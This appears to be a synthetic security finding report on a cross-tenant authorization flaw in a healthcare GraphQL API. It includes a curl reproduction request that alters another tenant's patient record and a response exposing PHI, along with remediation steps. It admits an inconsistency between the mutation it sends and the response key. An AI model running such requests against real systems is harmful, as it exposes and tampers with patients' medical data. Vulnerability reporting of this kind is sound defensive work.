# Security Analysis Report
**System:** PatientCore EHR API
**Domain:** Healthcare / EHR Platform
**Example ID:** GQL-0351
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.2 | Parameter escalation — a valid session holder extends scope by sending `updatePatient` mutation against victim patient record `P-2351`, achieving cross-tenant PHI access and persistence poisoning |

---

## Finding 1 — Single-User: Parameter Escalation (Pattern 10.2)

### Summary
The `updatePatient` mutation on PatientCore EHR API (`api.patientcore-ehr-api.example.com`) does not validate the patient record's `tenantId` against the JWT's `tenantId`. Per §5.0 Pattern 10.2, an attacker with `tenant-1edb` credentials extends their own session scope by targeting patient record `P-2351` (belonging to `tenant-85cf`) — modifying its `status` to `approved` and reassigning `ownerId`. The response returns the victim patient's PHI including `sensitiveField` and `internalNotes`.

**Context.txt inconsistency (documented):** HAR operation uses `updatePatient(id: "P-2351", ...)`, but the response JSON key is `getPatient`. These conflict. The HAR (§6.0) is the primary evidence — `updatePatient` is the authoritative affected operation.

**Redis cache vulnerability:** Cache is keyed by `patientId` only (no tenant dimension), enabling cross-tenant cache poisoning of EHR records.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected resolver:** `updatePatient`
**Affected endpoint:** `POST https://api.patientcore-ehr-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.patientcore-ehr-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-1edb

{"query": "query VulnerableOp { updatePatient(id: \"P-2351\", input: {status: \"approved\", ownerId: \"attacker-1edb85cf\"}) { patientId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Patient PHI Returned (cross-tenant, record mutated)**
```json
{
  "data": {
    "getPatient": {
      "tenantId": "tenant-85cf",
      "ownerId": "other-user-1edb85cf",
      "data": {
        "sensitiveField": "CONFIDENTIAL-1edb85cf",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-1edb`. Victim patient `P-2351` belongs to: `tenant-85cf`. Cross-tenant PHI access and persistence poisoning confirmed: patient record `status` set to `approved`, `ownerId` overwritten.

**Context.txt inconsistency:** HAR sends `updatePatient` mutation; response body uses key `getPatient`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.patientcore-ehr-api.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-1edb" \
  -d '{"query": "query VulnerableOp { updatePatient(id: \"P-2351\", input: {status: \"approved\", ownerId: \"attacker-1edb85cf\"}) { patientId status } }"}'
# Vulnerable: patient P-2351 (tenant-85cf) mutated; PHI disclosed — cross-tenant access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `updatePatient` resolver: fetch record first, verify `patient.tenantId` matches `jwt.tenantId` before applying mutation.
2. Reject client-supplied `ownerId` — ownership must be immutable or server-controlled.
3. Re-key Redis cache to include `tenantId`.
